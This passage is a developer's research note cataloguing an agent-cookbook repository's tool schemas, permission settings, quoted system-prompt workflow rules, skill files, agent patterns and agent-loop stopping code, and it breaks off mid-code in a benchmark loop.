# anthropics/anthropic-cookbook — source-grounded research note

## Source

- Repo path: `/Users/samuelchien/dev/software-devops/research/repos/automation/anthropics__anthropic-cookbook/`
- Git remote: `origin  https://github.com/anthropics/anthropic-cookbook.git (fetch/push)`
- HEAD (`git -C <path> log -1 --format='%H %ad %s'`):
  `f65eb122a51e9710d4db3f4893016879c65c77d6 Fri Aug 7 13:13:36 2026 -0400 Merge pull request #811 from anthropics/cj-ant/cma-budgets-advisor-cookbooks`

### Directory verification (discrepancies vs. the brief)

Actual top level (`find . -maxdepth 1`), verified: `.claude`, `.github`, `anthropic_cookbook`, `capabilities`, `claude_agent_sdk`, `coding`, `evals`, `extended_thinking`, `fable_5_fallback_billing`, `finetuning`, `images`, `managed_agents`, `misc`, `multimodal`, `observability`, `patterns`, `scripts`, `skills`, `tests`, `third_party`, `tool_evaluation`, `tool_use`, plus files `CLAUDE.md`, `CONTRIBUTING.md`, `README.md`, `LICENSE`, `Makefile`, `registry.yaml`, `authors.yaml`, `lychee.toml`, `pyproject.toml`, `tox.ini`, `uv.toml`, `uv.lock`, `requirements-dev.txt`, `.pre-commit-config.yaml`, `.env.example`, `.gitignore`.

Discrepancies with the dirs listed in the brief:
- **Missing from the brief**: `.claude/`, `.github/`, `fable_5_fallback_billing/`, `finetuning/`, `images/`, `scripts/`, `tests/`. `.claude/` in particular matters — it holds the repo's own agent, slash commands and a real SKILL.md.
- `anthropic_cookbook/` is a **stub package**, not content: it contains only `anthropic_cookbook/__init__.py`.
- `coding/` holds exactly one notebook; `observability/` holds exactly one notebook; `evals/` holds exactly one notebook (under `evals/agentic_search/`).
- File census: 117 `.py`, 96 `.ipynb`, 91 `.md`, 37 `.json`, 32 `.ts`, 17 `.yaml`, 15 `.yml`, 1 `.xml`.

---

## 1. Agent tool surface

### 1a. Client-side JSON-schema tools (Messages API `tools=[...]`)

**`/Users/samuelchien/dev/software-devops/research/repos/automation/anthropics__anthropic-cookbook/patterns/agents/async_multi_agent_orchestration.ipynb`** — messaging + subagent lifecycle tools (the "shape" of the Opus 4.8 system-card multi-agent patterns):

```python
SEND_MESSAGE = {
    "name": "send_message",
    "description": (
        "Send a message to one or more other agents. It will appear appended to their next tool "
        "result. This is the ONLY way to reach other agents — plain text in your turn goes nowhere."
    ),
    "input_schema": {
        "type": "object",
        "properties": {
            "recipient_ids": {"type": "array", "items": {"type": "string"}, "minItems": 1},
            "content": {"type": "string"},
        },
        "required": ["recipient_ids", "content"],
    },
}
WAIT_FOR_MESSAGE = {
    "name": "wait_for_message",
    "description": (
        "Block until another agent messages you. Note: messages also arrive automatically appended "
        "to the result of ANY other tool call, so only use this when you have nothing else to do."
    ),
    "input_schema": {"type": "object", "properties": {}},
}
```

Same file, the **subagent tool set** (`SUBAGENT_TOOLS`) — `create_subagents` (`base_instruction: string`, `per_subagent_instructions: array[string] maxItems 10`; required `base_instruction`), `get_status` (empty schema; "Status of every helper (active / idling / done / crashed)"), `kill_subagents` (`subagent_ids: array[string] minItems 1`). Plus `sleep` (`seconds: integer, minimum 0, maximum 10`).

Remaining client-side tool sets, by defining file (all under `/Users/samuelchien/dev/software-devops/research/repos/automation/anthropics__anthropic-cookbook/`):

| File | Tool names → `input_schema` properties (required in bold) |
|---|---|
| `tool_use/context_engineering/context_engineering_tools.ipynb` | `search_files`(**query**:string) · `read_file`(**path**:string, e.g. `/research/celegans_review.md`) · `record_finding`(**finding**:string — "held for the duration of this session only; they are not persisted across sessions") · plus `MEMORY_TOOL_SPEC = {"type": "memory_20250818", "name": "memory"}` added *only* when a handler is passed |
| `tool_use/customer_service_agent.ipynb` | `get_customer_info`(**customer_id**:string) · `get_order_details`(**order_id**:string) · `cancel_order`(**order_id**:string) |
| `tool_use/calculator_tool.ipynb` | `calculator`(**expression**:string) |
| `tool_use/threat_intel_enrichment_agent.ipynb` | `lookup_ip_reputation`(**ip_address**) · `lookup_file_hash`(**file_hash**, **hash_type**) · `lookup_domain`(**domain**) · `get_mitre_techniques`(**query**) |
| `tool_use/tool_choice.ipynb` | `web_search` · `get_customer_info`(**username**) · `send_text_to_user`(**text**); demonstrates `tool_choice={"type":"auto"\|"any"\|"tool"}` |
| `multimodal/crop_tool.ipynb` | `zoom` (image-crop tool, driven by the SDK `tool_runner`) |

**`/Users/samuelchien/dev/software-devops/research/repos/automation/anthropics__anthropic-cookbook/tool_use/tool_search_alternate_approaches.ipynb`** — the dynamic tool-loading pattern; `describe_tool` is the only tool in the initial request:

```python
DESCRIBE_TOOL = {
    "name": "describe_tool",
    "description": "Load a tool's full definition into context. Call this before using any tool for the first time.",
    "input_schema": {"type": "object",
        "properties": {"tool_name": {"type": "string", "description": "Name of the tool to load"}},
        "required": ["tool_name"]},
}
```
Its `TOOL_LIBRARY` holds `get_weather`, `get_stock_price`, `convert_currency`, `calculate_tip`, `send_email`. `/Users/samuelchien/dev/software-devops/research/repos/automation/anthropics__anthropic-cookbook/tool_use/tool_search_with_embeddings.ipynb` is the embeddings-backed variant (11 `input_schema` blocks, a `tool_search` tool).

Function-decorator style tools live in **`/Users/samuelchien/dev/software-devops/research/repos/automation/anthropics__anthropic-cookbook/tool_use/utils/customer_service_tools.py`** using `from anthropic import beta_tool` — `@beta_tool def get_next_ticket()`, `classify_ticket(ticket_id, category: Literal["billing","technical","account","product","shipping"])`, `search_knowledge_base(category, query)`, etc.

### 1b. Server-side / typed tool identifiers actually used in this repo

Counted across all 96 notebooks (`grep -ho '"type": "[a-z_0-9]*_20[0-9]*"'`):

| Type string | Occurrences | Where |
|---|---|---|
| `agent_toolset_20260401` | 24 | all `managed_agents/CMA_*.ipynb`, `managed_agents/sre_incident_responder.ipynb`, `managed_agents/data_analyst_agent.ipynb` |
| `code_execution_20250825` | 11 | `skills/notebooks/0{1,2,3}_*.ipynb`, `tool_use/programmatic_tool_calling_ptc.ipynb` |
| `clear_tool_uses_20250919` | 4 | `tool_use/context_engineering/context_engineering_tools.ipynb`, `tool_use/memory_cookbook.ipynb` |
| `compact_20260112` | 4 | same two + `evals/agentic_search/reproduce_agentic_search_benchmarks.ipynb` |
| `memory_20250818` | 3 | `tool_use/memory_cookbook.ipynb`, `tool_use/context_engineering/context_engineering_tools.ipynb` |
| `clear_thinking_20251015` | 2 | `tool_use/context_engineering/context_engineering_tools.ipynb` |
| `code_execution_20260521`, `web_search_20260318`, `web_fetch_20260318` | 1 each | `evals/agentic_search/reproduce_agentic_search_benchmarks.ipynb` |

The **programmatic-tool-calling (PTC) surface**, `/Users/samuelchien/dev/software-devops/research/repos/automation/anthropics__anthropic-cookbook/evals/agentic_search/reproduce_agentic_search_benchmarks.ipynb`:

```python
TOOLS = [
    {"type": "code_execution_20260521", "name": "code_execution"},
    {"type": "web_search_20260318", "name": "web_search",
     "max_uses": 10_000, "allowed_callers": ["code_execution_20260521"],
     "response_inclusion": "excluded"},
    {"type": "web_fetch_20260318", "name": "web_fetch",
     "max_uses": 10_000, "max_content_tokens": 1_000_000,
     "allowed_callers": ["code_execution_20260521"],
     "response_inclusion": "excluded"},
]
BETAS = ["compact-2026-01-12", "task-budgets-2026-03-13"]
```

`/Users/samuelchien/dev/software-devops/research/repos/automation/anthropics__anthropic-cookbook/tool_use/programmatic_tool_calling_ptc.ipynb` states the opt-in rule verbatim: *"Tools without allowed_callers default to model-only invocation … Tools can be invoked by both the model AND code execution by including multiple callers: `["direct", "code_execution_20250825"]` … Only opt in tools that are safe for programmatic/repeated execution."*

**Managed Agents built-in toolset** (`agent_toolset_20260401`) is configured per-tool by name. Named members observed: `web_search`, `web_fetch`, `read`, `write`, `edit`, `bash`, `grep`. Two config shapes appear:

```python
# /Users/.../managed_agents/CMA_gate_human_in_the_loop.ipynb
{"type": "agent_toolset_20260401",
 "default_config": {"enabled": True, "permission_policy": {"type": "always_allow"}}}
# /Users/.../managed_agents/CMA_verify_with_outcome_grader.ipynb
{"type": "agent_toolset_20260401",
 "configs": [{"name": "web_search"}, {"name": "web_fetch"}, {"name": "read"}, {"name": "write"}]}
# /Users/.../managed_agents/sre_incident_responder.ipynb — allow-all but disable egress
{"type": "agent_toolset_20260401",
 "default_config": {"enabled": True, "permission_policy": {"type": "always_allow"}},
 "configs": [{"name": "web_search", "enabled": False}, {"name": "web_fetch", "enabled": False}]}
```

**Managed-Agents subagent/advisor roster** (`/Users/samuelchien/dev/software-devops/research/repos/automation/anthropics__anthropic-cookbook/managed_agents/CMA_coordinate_specialist_team.ipynb` and `.../CMA_consult_an_advisor.ipynb`) is declared as config, not as a tool schema:

```python
multiagent={"type": "coordinator",
            "agents": [prospect_researcher, case_study_picker, pricing_modeler,
                       {"type": "advisor", "model": ADVISOR_MODEL}]}
```
Subagents return results via a platform-provided `send_to_parent`; the advisor surfaces as an `advisor` tool that "takes no input, because the advisor reads the whole conversation up to the call rather than a query the working model writes" (`CMA_consult_an_advisor.ipynb`).

### 1c. DevOps-flavoured tools — the SRE MCP server

**`/Users/samuelchien/dev/software-devops/research/repos/automation/anthropics__anthropic-cookbook/claude_agent_sdk/site_reliability_agent/sre_mcp_server.py`** (2,722 lines) defines `TOOLS = [...]` with MCP-style `inputSchema`. Full list:

| Tool | `inputSchema` properties (required) |
|---|---|
| `query_metrics` | `promql: string` (required) — description embeds a PromQL cheat-sheet and a 4-step "Investigation workflow" |
| `list_metrics` | `{}` |
| `get_service_health` | `{}` |
| `get_logs` | `service: string` (req), `level: enum[all,error,warn,info]`, `lines: integer` (default 20, max 100) |
| `get_alerts` | `{}` |
| `get_recent_deployments` | `service: string` (optional) |
| `execute_runbook` | `runbook: enum[database_connection_exhaustion, high_latency_cascade, elevated_error_rates]`, `phase: enum[investigate, remediate]` (both required) |
| `read_config_file` | `path: string` (req) |
| `edit_config_file` | `path`, `old_value`, `new_value` (all req) |
| `run_shell_command` | `command: string` (req) |
| `get_container_logs` | `container: string` (req), `lines: integer` (default 50, max 200) |
| `write_postmortem` | `title`, `summary`, `root_cause` (req); `timeline`, `remediation`, `action_items` |
| `pagerduty_create_incident` | `title`, `description` (req); `urgency: enum[high,low]`, `service_id` — the four PagerDuty tools are gated on `if PAGERDUTY_API_KEY:` (`sre_mcp_server.py:374`) |
| `pagerduty_update_incident` / `pagerduty_get_incident` / `pagerduty_list_incidents` | `incident_id` + status/notes / `incident_id` / filters |
| `confluence_create_postmortem` / `confluence_get_page` / `confluence_list_postmortems` | Confluence page IO |

`execute_runbook`'s description encodes the ordering rule directly: *"Each runbook has two phases: - investigate … - remediate (requires investigation first) … Always run the investigate phase first to confirm the issue before remediation."* `run_shell_command`'s description encodes a correctness rule: *"IMPORTANT: After editing config files, you MUST use 'up -d' (not 'restart') to apply changes. 'restart' does NOT reload env files — only 'up -d' recreates the container with new config."*

Other MCP surfaces: `/Users/samuelchien/dev/software-devops/research/repos/automation/anthropics__anthropic-cookbook/claude_agent_sdk/observability_agent/agent.py` runs the **official GitHub MCP server** in Docker (`ghcr.io/github/github-mcp-server`, env `GITHUB_PERSONAL_ACCESS_TOKEN`); `/Users/samuelchien/dev/software-devops/research/repos/automation/anthropics__anthropic-cookbook/managed_agents/cma-mcp/src/tools.ts` is a TypeScript MCP server exposing the Managed Agents API itself.

### 1d. Claude Agent SDK built-in tools, `allowed_tools`, permission modes, hooks

All `allowed_tools` sites in source (not notebooks):

| File | Value |
|---|---|
| `/Users/.../claude_agent_sdk/research_agent/agent.py:103` | `allowed_tools=["WebSearch", "Read"]` |
| `/Users/.../claude_agent_sdk/chief_of_staff_agent/agent.py:87-94` | `["Task", "Read", "Write", "Edit", "Bash", "WebSearch"]` (`Task` commented `# enables subagent delegation`) |
| `/Users/.../claude_agent_sdk/observability_agent/agent.py:107,111` | `allowed_tools = [f"mcp__{name}" for name in servers]`; `disallowed_tools = ["Bash", "Task", "WebSearch", "WebFetch"] if restrict_to_mcp else []` |
| `/Users/.../claude_agent_sdk/hosting/server.py:65,139` | `ALLOWED_TOOLS = ["WebSearch"]` |
| `/Users/.../claude_agent_sdk/site_reliability_agent/examples/sre_bot_slack.py:434-456` | 18 explicit `mcp__sre__*` names, grouped Investigation / PagerDuty / Confluence / Remediation |

`/Users/samuelchien/dev/software-devops/research/repos/automation/anthropics__anthropic-cookbook/claude_agent_sdk/06_The_vulnerability_detection_agent.ipynb` uses tool *withholding* as the safety control, with four distinct pipeline stages:
`allowed_tools=["Read","Write","Edit"], disallowed_tools=["Bash"]` (threat model) → `["Read","Grep","Glob"], disallowed_tools=["Bash"]` (find) → `["Read","Grep"], disallowed_tools=["Bash"]` (triage) → `allowed_tools=[]` (report). It also uses `system_prompt={"type": "preset", "preset": "claude_code", "append": ENGAGEMENT_CONTEXT}`.

**Permission modes**, `/Users/samuelchien/dev/software-devops/research/repos/automation/anthropics__anthropic-cookbook/claude_agent_sdk/chief_of_staff_agent/agent.py:44,55`:

```python
permission_mode: Literal["default", "plan", "acceptEdits"] = "default",
#   permission_mode: "default" (execute), "plan" (think only), or "acceptEdits"
```
`acceptEdits` is used in `/Users/.../claude_agent_sdk/observability_agent/agent.py:120` and `/Users/.../claude_agent_sdk/site_reliability_agent/examples/sre_bot_slack.py:458`.

**`setting_sources`** — the SDK is isolated by default; `/Users/.../claude_agent_sdk/chief_of_staff_agent/agent.py:100-106`:

```python
# IMPORTANT: setting_sources must include "project" to load filesystem settings:
# - Slash commands from .claude/commands/
# - CLAUDE.md project instructions
# - Subagent definitions from .claude/agents/
# - Hooks from .claude/settings.local.json
# Without this, the SDK operates in isolation mode with no filesystem settings loaded.
setting_sources=["project", "local"],
```

**Hooks.** `PostToolUse` wiring in `/Users/.../claude_agent_sdk/chief_of_staff_agent/.claude/settings.local.json` (matchers `Bash`→`script-usage-logger.py`, `Write`→`report-tracker.py`, `Edit`→`report-tracker.py123` — note the trailing `123` is a real typo in the file, so the Edit hook path does not exist). `PreToolUse`/`SessionStart` wiring in `/Users/.../skills/.claude/settings.json` with `toolFilter: ["Write"]` / `["Bash"]`. `PreToolUse` blocking semantics are stated in `/Users/.../claude_agent_sdk/site_reliability_agent/infra_setup.py:1015-1027`.

---

## 2. System prompts / policy text — workflow discipline (verbatim)

**(1) Never merge without approval** — `/Users/samuelchien/dev/software-devops/research/repos/automation/anthropics__anthropic-cookbook/managed_agents/sre_incident_responder.ipynb`:

```
Workflow for every alert:
1. Read the logs and identify the failure signature.
2. Find the root cause in the infrastructure repo, save a copy of the
   original file, edit it in place, then produce a unified diff with
   `diff -u`.
3. open_pull_request(title, body, diff) with the fix.
4. request_approval(summary) and wait for the human's decision.
5. Only if the result is "approved", merge_pull_request(pr_number).
   Otherwise stop and report.

Never call merge_pull_request unless request_approval returned
"approved". Keep the fix minimal — do not refactor unrelated config.
```

**(2) Wait for explicit confirmation before remediating** — `/Users/samuelchien/dev/software-devops/research/repos/automation/anthropics__anthropic-cookbook/claude_agent_sdk/site_reliability_agent/examples/sre_bot_slack.py:263+`:

```
For investigations, share your findings and offer
remediation options. *Always wait for explicit user
confirmation before executing any remediation action.*
For simple requests (like creating a PagerDuty incident),
just do it and confirm.
```

**(3) Two-step close-out gate, with ordering** — same file:

```
1. *Offer to close out the incident* - Ask the user:
"The fix has been applied and verified. Would you like
me to resolve the PagerDuty incident and create a
post-mortem?"
2. *Wait for user confirmation* - Do NOT proceed until
the user confirms (e.g., "yes", "go ahead", "do it")
3. Once confirmed, perform actions IN THIS ORDER:
   a. FIRST create the post-mortem using
   confluence_create_postmortem
   ...
IMPORTANT: Always create the post-mortem BEFORE resolving
the PagerDuty incident.
```

**(4) Escalate irreversible decisions to a stronger model** — `/Users/samuelchien/dev/software-devops/research/repos/automation/anthropics__anthropic-cookbook/managed_agents/CMA_consult_an_advisor.ipynb`:

```
You have an advisor: a more capable model that can review your conversation so far and
send back guidance. Consult it with the advisor tool before you commit to any decision
that would be expensive to reverse once clients depend on it: identifier and idempotency
schemes, pagination contracts, error semantics, versioning. Do routine drafting yourself.
When you consult, act on the guidance you get back and say what you changed.
```

**(5) Escalate ambiguity, one decision per item, then stop** — `/Users/samuelchien/dev/software-devops/research/repos/automation/anthropics__anthropic-cookbook/managed_agents/CMA_gate_human_in_the_loop.ipynb`:

```
Call decide(receipt_id, action, reason) for clear cases, or escalate(receipt_id,
question) for ambiguous ones (near thresholds, unclear categories, suspicious notes).
Once you've called decide or escalate for a given receipt, that receipt is finalized
— do not call either tool for it again. After processing all receipts exactly once, stop.
```

**(6) Stop when marginal value is gone; never delegate the writeup** — `/Users/samuelchien/dev/software-devops/research/repos/automation/anthropics__anthropic-cookbook/patterns/agents/prompts/research_lead_agent.md:150-151`:

```
4. For the sake of efficiency, when you have reached the point where further research has
diminishing returns and you can give a good enough answer to the user, STOP FURTHER RESEARCH
and do not create any new subagents. ...
5. NEVER create a subagent to generate the final report - YOU write and craft this final
research report yourself ... you are never allowed to use subagents to create the report.
```

**(7) No clarifying questions; verify subagent output** — same file, line 155:

```
No clarifications will be given, therefore use your best judgment and do not attempt to ask
the user questions. ... Critically think about the results provided by subagents and reason
about them carefully to verify information and ensure you provide a high-quality, accurate report.
```

**(8) Read-only tool discipline for integrations** — same file, line 131:

```
Whenever extra tools are available beyond the Google Suite tools and the web_search or
web_fetch tool, always use the relevant read-only tools once or twice to learn how they work
... DO NOT use write, create, or update tools.
```

**(9) Fan-out budget** — same file, line 86: `**IMPORTANT**: Never create more than 20 subagents unless strictly necessary. ... Prefer fewer, more capable subagents over many overly narrow ones. More subagents = more overhead.`

**(10) Don't guess parameters — ask for the missing one** — `/Users/samuelchien/dev/software-devops/research/repos/automation/anthropics__anthropic-cookbook/tool_use/tool_choice.ipynb`:

```
Only call tools when you have enough information to accurately call them.
Do not call the get_customer_info tool until a user has provided you with their username.
This is important. If you do not know a user's username, simply ask a user for their username.
```

**(11) Prefer no tool when confident** — same file: `Answer as many questions as you can using your existing knowledge. Only search the web for queries that you can not confidently answer. ... If you think a user's question involves something in the future that hasn't happened yet, use the search tool.`

**(12) Verify sources rather than trust them** — `/Users/samuelchien/dev/software-devops/research/repos/automation/anthropics__anthropic-cookbook/managed_agents/CMA_verify_with_outcome_grader.ipynb` writer prompt: `Only cite pages you actually fetched and read. The quote must be copied character-for-character from the page. Cite no more than 6 sources total. Pick the strongest; do not pad.`

**(13) Structured self-report + tool feedback contract** — `/Users/samuelchien/dev/software-devops/research/repos/automation/anthropics__anthropic-cookbook/tool_evaluation/tool_evaluation.ipynb`:

```
When given a task, you MUST:
1. Use the available tools to complete the task
2. Provide summary of each step in your approach, wrapped in <summary> tags
3. Provide feedback on the tools provided, wrapped in <feedback> tags
4. Provide your final response, wrapped in <response> tags
...
- If you cannot solve the task return <response>NOT_FOUND</response>
```

**(14) Never print a secret / never pass it as a flag** — `/Users/samuelchien/dev/software-devops/research/repos/automation/anthropics__anthropic-cookbook/managed_agents/sentry/agent_config.py:17-50`:

```
# The system prompt carries everything that isn't a secret: org and project
# slugs, the triage method, the report format. Never the token; system
# prompts are stored in the session's event history.
...
- `sentry-cli` is installed. It authenticates via the SENTRY_AUTH_TOKEN environment
variable, which is already set. Never print it, and never pass it as a CLI flag.
```
The same prompt sets a triage workflow ("Classify each as NEW / REGRESSION / ESCALATING / ONGOING. Rank by user impact, not raw event count.") and an anti-padding stop rule ("If there are no issues in the window, say so in one line. Do not pad.").

**(15) Escalation path baked into a routed persona** — `/Users/samuelchien/dev/software-devops/research/repos/automation/anthropics__anthropic-cookbook/patterns/agents/basic_workflows.ipynb`, `technical` route: `5. End with escalation path if needed`.

**(16) Don't ask for clarification (opposite policy, deliberately)** — `/Users/samuelchien/dev/software-devops/research/repos/automation/anthropics__anthropic-cookbook/misc/session_memory_compaction.ipynb:317`: `DO NOT ask the user to provide more context or clarify their request. Assume you have enough information to proceed.`

**(17) Repo-level policy for humans and the agent alike** — `/Users/samuelchien/dev/software-devops/research/repos/automation/anthropics__anthropic-cookbook/CLAUDE.md:58-81`: `1. **API Keys:** Never commit .env files.` / `2. **Dependencies:** Use uv add ... Never edit pyproject.toml directly.` / `**Never use dated model IDs** ... Always use the non-dated alias.` / `5. **Quality checks:** Run make check before committing.`

**(18) Constrain the reviewer agent's scope** — `/Users/samuelchien/dev/software-devops/research/repos/automation/anthropics__anthropic-cookbook/.claude/commands/notebook-review.md`: `**IMPORTANT**: Only review the files explicitly listed in the prompt above. Do not search for or review additional files.` (identical line in `.claude/commands/model-check.md` and `.claude/commands/link-review.md`.)

**(19) Threat-model / authorization preamble** — `/Users/samuelchien/dev/software-devops/research/repos/automation/anthropics__anthropic-cookbook/claude_agent_sdk/06_The_vulnerability_detection_agent.ipynb`: the `ENGAGEMENT_CONTEXT` block "records the scope of this assessment (authorized by the code owner, isolated read-only sandbox, findings headed for responsible disclosure) so every step in the pipeline operates against the same documented ground rules. Keep those three claims true for any real target."

**(20) Mandate tool use over a shortcut** — `/Users/samuelchien/dev/software-devops/research/repos/automation/anthropics__anthropic-cookbook/claude_agent_sdk/chief_of_staff_agent/.claude/agents/financial-analyst.md`: `When asked about hiring engineers, ALWAYS use the hiring_impact.py tool` and a hard constraint `1. Impact on runway (must maintain >12 months)`.

---

## 3. Workflow / skill definitions

### 3a. `skills/` — 4 SKILL.md files total in the repo

`find . -name SKILL.md` returns **4** files: three demo skills under `/Users/samuelchien/dev/software-devops/research/repos/automation/anthropics__anthropic-cookbook/skills/custom_skills/` (`analyzing-financial-statements/`, `applying-brand-guidelines/`, `creating-financial-models/`) and one *live, repo-operational* skill at `/Users/samuelchien/dev/software-devops/research/repos/automation/anthropics__anthropic-cookbook/.claude/skills/cookbook-audit/SKILL.md`. Each demo skill bundles Python scripts (`calculate_ratios.py`+`interpret_ratios.py`; `apply_brand.py`+`validate_brand.py`+`REFERENCE.md`; `dcf_model.py`+`sensitivity_analysis.py`).

Format = YAML frontmatter (`name`, `description`) + markdown body. A short real example, `/Users/samuelchien/dev/software-devops/research/repos/automation/anthropics__anthropic-cookbook/managed_agents/sre_incident_responder.ipynb` (`RUNBOOK_SKILL`, printed verbatim):

```markdown
---
name: incident-runbooks
description: How to triage production incidents using the team runbooks.
---

# Incident runbooks

When an alert references a service, locate that service's recent logs
and identify the failure signature (the repeating error class, exit
code, or status pattern).

Consult the team runbooks before proposing any fix. Runbooks are
organised by failure signature — for example `oom.md`, `5xx.md`,
`latency.md`. Each one lists the triage steps for that class of
failure and the configuration that usually needs to change.

Any fix to infrastructure code must be opened as a pull request that
cites the runbook you followed. Do not patch live resources directly.
```

Discovery convention (`/Users/samuelchien/dev/software-devops/research/repos/automation/anthropics__anthropic-cookbook/managed_agents/CMA_use_skills_from_a_repo.ipynb`): `.claude/skills/<skill-name>/SKILL.md` at repo root; the harness "scans the repository's root `.claude/skills/` directory at session start and injects every skill it finds into the agent's system prompt: the skill's name, its description, and its path inside the sandbox." Description doubles as the trigger: "it should read like a trigger: what the skill does and when to reach for it."

Built-in Anthropic skills documented in `/Users/samuelchien/dev/software-devops/research/repos/automation/anthropics__anthropic-cookbook/skills/README.md:240-249`: `xlsx`, `pptx`, `pdf`, `docx`, invoked via `container={"skills":[{"type":"anthropic","skill_id":"xlsx","version":"latest"}]}` with beta headers `code-execution-2025-08-25,files-api-2025-04-14,skills-2025-10-02`. Three teaching notebooks under `skills/notebooks/`.

Note: `managed_agents/{sentry,slack,linear,roadtrip_planner,cma-mcp}/skill.md` are lowercase `skill.md` operator notes, not agent skills.

### 3b. `patterns/agents/` — the "Building Effective Agents" reference implementations

`/Users/samuelchien/dev/software-devops/research/repos/automation/anthropics__anthropic-cookbook/patterns/agents/README.md` lists: Prompt Chaining, Routing, Multi-LLM Parallelization, Orchestrator-Subagents, Evaluator-Optimizer.

| Pattern | File | Description (from the notebook's own text) | SWE/DevOps relevance |
|---|---|---|---|
| Prompt chaining | `patterns/agents/basic_workflows.ipynb` — `chain()` | "Decomposes a task into sequential subtasks, where each step builds on previous results." | Medium — data-shaping pipelines |
| Parallelization | same file — `parallel()` (`ThreadPoolExecutor`) | "Distributes independent subtasks across multiple LLMs for concurrent processing." | Medium — fan-out over files/services |
| Routing | same file — `route()` | "Dynamically selects specialized LLM paths based on input characteristics." Selector emits `<reasoning>`+`<selection>`. | **High** — ticket/alert triage; the four routes are billing/technical/account/product support personas |
| Orchestrator-workers | `patterns/agents/orchestrator_workers.ipynb` — `FlexibleOrchestrator` | "The orchestrator decides *at runtime* what subtasks to create, making this more adaptive than pre-defined parallel workflows." Explicit "Don't use this pattern when: … Subtasks are predictable and can be pre-defined." | **High** — variable-shape refactors, multi-service investigations |
| Evaluator-optimizer | `patterns/agents/evaluator_optimizer.ipynb` — `loop()` | "one LLM call generates a response while another provides evaluation and feedback in a loop." Worked example is literally an "Iterative coding loop" (implement O(1) `getMin()` stack) with criteria "1. code correctness 2. time complexity 3. style and best practices". | **Highest** — this is the CI-style accept/reject gate |
| Async multi-agent / dynamic subagent spawn | `patterns/agents/async_multi_agent_orchestration.ipynb` | "the two multi-agent orchestration patterns behind the multi-agent results in the Claude Opus 4.8 system card: a **fixed N-agent team** and **async subagents**." | High — long-running parallel agent fleets |

Supporting prompts (production-grade, ~224 lines total): `patterns/agents/prompts/research_lead_agent.md` (155 lines — planning, delegation budget, stop criteria), `patterns/agents/prompts/research_subagent.md` (47), `patterns/agents/prompts/citations_agent.md` (22). Shared helper `patterns/agents/util.py` — `llm_call(prompt, system_prompt="", model="claude-sonnet-4-6")` at `temperature=0.1, max_tokens=4096`, and `extract_xml(text, tag)` regex parser.

### 3c. `coding/`, `observability/`, `evals/`

- **`/Users/samuelchien/dev/software-devops/research/repos/automation/anthropics__anthropic-cookbook/coding/prompting_for_frontend_aesthetics.ipynb`** — the only file in `coding/`. Not an agent pattern; a system-prompt-fragment library (`DISTILLED_AESTHETICS_PROMPT` wrapped in `<frontend_aesthetics>` tags) intended to be "append[ed] … to your system prompt or CLAUDE.md file". Notable as an anti-mode-collapse guardrail: *"You tend to converge toward generic, 'on distribution' outputs. In frontend design, this creates what users call the 'AI slop' aesthetic."*
- **`/Users/samuelchien/dev/software-devops/research/repos/automation/anthropics__anthropic-cookbook/observability/usage_cost_api.ipynb`** — the only file in `observability/`. Messages Usage API + Cost API, "Cost Attribution: Allocate expenses across teams/projects by workspace", requires `sk-ant-admin...`. This is **FinOps**, not agent tracing. Agent tracing lives in `claude_agent_sdk/02_The_observability_agent.ipynb` (GitHub/CI via MCP), `claude_agent_sdk/05_Building_a_session_browser.ipynb`, `claude_agent_sdk/utils/agent_visualizer.py`, and `claude_agent_sdk/04_migrating_from_openai_agents_sdk.ipynb` ("OTel-native — plugs into your existing Grafana/Datadog/Honeycomb").
- **`/Users/samuelchien/dev/software-devops/research/repos/automation/anthropics__anthropic-cookbook/evals/agentic_search/`** — one notebook + `utils/agentic_search.py` (330+ lines). Reproduces BrowseComp (1,266 q) and DeepSearchQA (900 q). Two grader prompts in `utils/agentic_search.py`: an F1/precision/recall list grader and `BROWSECOMP_GRADER_PROMPT` (A=match / B=no-match / C=abstain, `max_tokens=8`). Other eval material sits outside `evals/`: `misc/building_evals.ipynb`, `misc/generate_test_cases.ipynb`, `capabilities/*/evaluation/promptfooconfig.yaml`, and `tool_evaluation/`.

---

## 4. Definition of done / stopping criteria (the loop code)

### 4a. `stop_reason == "end_turn"` as the terminator, with a hard turn cap

`/Users/samuelchien/dev/software-devops/research/repos/automation/anthropics__anthropic-cookbook/patterns/agents/async_multi_agent_orchestration.ipynb` — the canonical shape, including an explicit "unexpected stop reason is a bug" raise and a `max_turns` fallback string:

```python
async def run_agent(hub, name, system, first_user_turn, tools=None,
                    extra_dispatch=None, max_turns: int = 20) -> str:
    ...
    try:
        for _ in range(max_turns):
            resp = await client.messages.create(model=MODEL, max_tokens=2048,
                                                system=system, tools=tools, messages=messages)
            messages.append({"role": "assistant", "content": resp.content})

            if resp.stop_reason == "end_turn":
                hub.status[name] = "done"
                return "".join(getattr(b, "text", "") for b in resp.content)
            if resp.stop_reason != "tool_use":
                raise RuntimeError(f"unexpected stop_reason: {resp.stop_reason}")
            ...
            inbox = hub.drain(name)
            if results:
                results[-1]["content"] += hub.render(inbox)  # ← the key line
            messages.append({"role": "user", "content": results})

        hub.status[name] = "done"
        return f"[{name} hit max_turns={max_turns}]"
    except Exception:
        hub.status[name] = "crashed"
        raise
```

`/Users/samuelchien/dev/software-devops/research/repos/automation/anthropics__anthropic-cookbook/tool_use/threat_intel_enrichment_agent.ipynb` — same shape, with the budget rationale in a comment and a diagnostic message on cap-hit:

```python
MAX_TURNS = 10  # cap the agent loop to prevent runaway costs
...
    for _turn in range(MAX_TURNS):
        response = client.messages.create(model=MODEL_NAME, max_tokens=4096,
                                          system=SYSTEM_PROMPT, tools=tools, messages=messages)
        if response.stop_reason == "end_turn":
            final_text = next((block.text for block in response.content if hasattr(block, "text")),
                              "No analysis generated.")
            return final_text, tool_calls_made
        if response.stop_reason == "tool_use":
            ...
        else:
            return f"Agent stopped unexpectedly: {response.stop_reason}", tool_calls_made
    return (f"Agent reached max_turns limit ({MAX_TURNS}) without completing analysis. "
            f"Consider raising MAX_TURNS or simplifying the investigation scope.", tool_calls_made)
```

### 4b. The benchmark loop — `pause_turn` checkpointing, budget, compaction

`/Users/samuelchien/dev/software-devops/research/repos/automation/anthropics__anthropic-cookbook/evals/agentic_search/reproduce_agentic_search_benchmarks.ipynb` — the densest "done" definition in the repo. `end_turn` returns; `pause_turn`/`max_tokens` continue; anything else raises; exhausting 100 turns raises:

```python
def sample(question: str, *, max_turns: int = 100) -> dict:
    ...
    for turn in range(max_turns):
        with client.beta.messages.stream(**request) as stream:
            response = stream.get_final_message()
        ...
        if getattr(response, "container", None) is not None:
            request["container"] = response.container.id     # persist sandbox state across turns
        messages.append({"role": "assistant",
